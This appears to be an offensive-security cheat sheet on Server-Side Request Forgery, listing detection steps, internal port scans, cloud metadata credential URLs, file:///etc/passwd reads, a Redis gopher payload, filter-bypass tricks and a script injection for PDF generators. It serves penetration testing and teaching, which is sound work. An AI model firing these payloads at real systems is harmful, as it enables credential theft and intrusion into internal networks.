# SSRF (Server-Side Request Forgery)

## Overview
Server-Side Request Forgery occurs when an attacker can force a web server to make HTTP requests on their behalf. This allows the attacker to interact with internal services that are otherwise protected by firewalls, access cloud metadata instances, or use the target server as a proxy to attack third-party systems.

## When This Happens
- Features that fetch external resources (URL previews, webhook configurations, PDF generators from HTML, image fetchers).
- API integrations requiring a user-supplied callback URL.
- Hidden parameters or headers ending with `Url`, `Uri`, `Host`, `Path`, `To`, etc.

---

## Recon / Detection

### 1. Identify Input Vectors
Look for parameters where the application expects a URL:
- `url=http://example.com/image.jpg`
- `webhook_url=https://my-domain.com/callback`
- `PDF(HTML) -> PDF(HTML with <img src="http://attacker.com">)`
- Hidden fields in JSON bodies: `{"avatar":"http://example.com/img"}`

### 2. Perform Out-of-Band (OOB) Testing
Input a URL that you control (e.g., Burp Collaborator, interactsh, or a custom VPS).
```
url=http://your-collaborator-id.oastify.com
```
If you receive an HTTP request or a DNS lookup to your server, SSRF is confirmed. Note the `User-Agent` and IP address to understand what backend system actually made the request.

---

## Exploitation Steps

### 1. Internal Port Scanning
If SSRF is confirmed, you can scan the internal network (localhost or internal subnets) to find open ports. Use Burp Intruder on the port or IP.
```
http://127.0.0.1:80
http://127.0.0.1:22
http://127.0.0.1:3306
http://127.0.0.1:6379 (Redis)
```
Analyze the response times, status codes, or content lengths to infer if the port is open.

### 2. Accessing Cloud Metadata
If the target is hosted on a cloud provider, aim for the metadata instance, which often contains sensitive temporary IAM credentials or user data.
**AWS:**
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
```
**Google Cloud (requires header `Metadata-Flavor: Google`):**
```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```
**DigitalOcean:**
```
http://169.254.169.254/metadata/v1.json
```

### 3. Exploiting Internal Services
If you find open internal services, you might be able to exploit them without needing authentication, if they assume requests from `localhost` are safe.
- **Admin Panels:** `http://localhost/admin`
- **Jupyter Notebooks:** Often exposed internally without auth.
- **Docker APIs:** `http://localhost:2375` (Can lead to RCE).
- **Elasticsearch:** `http://localhost:9200/_search` (Data extraction).

---

## Filter Bypasses

### 1. IP Address Obfuscation
If `127.0.0.1` is blocked:
- **IPv6:** `[::1]` or `[0:0:0:0:0:0:0:1]`
- **Decimal IP:** `2130706433` (Equivalent of 127.0.0.1)
- **Octal IP:** `0177.0000.0000.0001`
- **Hex IP:** `0x7f000001`
- **Omitting zeros:** `127.1` or `127.0.1`

### 2. Localhost Domain Resolution
Use a domain that resolves to `127.0.0.1`:
- `localtest.me`
- `readme.localtest.me`
- `spoofed.burpcollaborator.net`
- Or create your own A record pointing to `127.0.0.1`.

### 3. Redirection bypass
Provide a URL to your attacker server (`http://attacker.com/redirect`), and set your server to redirect (HTTP 301/302) the request to the internal target (`Location: http://169.254.169.254/latest/meta-data/`).

### 4. DNS Rebinding
If the application validates the IP address of a domain before fetching it, use DNS rebinding. Set a DNS record with a very low TTL (Time To Live). When the application validates it, it points to a safe IP. When the application fetches it a millisecond later, it points to `127.0.0.1`.
- Use tools like `rbndr.us` or `singularity`.

---

## Alternative Protocols

SSRF isn't limited to `http://`. Different backend fetching mechanisms support different URI schemas:

### File Protocol
Read local system files.
```
file:///etc/passwd
file:///C:/Windows/win.ini
```

### Gopher Protocol
If `curl` is used on the backend, Gopher allows sending complex multiline payloads. This is crucial for exploiting internal services like Redis, Memcached, or SMTP that expect newline-separated commands.
```
gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0ainfo%0d%0a
```

### Dict
Can be used to probe internal ports and retrieve banners.
```
dict://127.0.0.1:22/info
```

---

## Real-World Notes

- **Blind SSRF**: If you cannot see the response content, it is "Blind". You can still map the internal network by using time delays or out-of-band tools, but exploiting metadata is very difficult unless you can bounce the traffic back out to yourself.
- **PDF Generators (HTML to PDF)**: Often vulnerable. Inject `<iframe src="file:///etc/passwd"></iframe>` or `<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","http://169.254.169.254/latest/meta-data/");x.send();</script>` and see what renders in the PDF.

## References
- [SSRF via XML-RPC Pingback Workflow](../scenarios/ssrf-via-xmlrpc-pingback-workflow.md)
- [Exploitation Methodology](../methodology/exploitation-methodology.md)
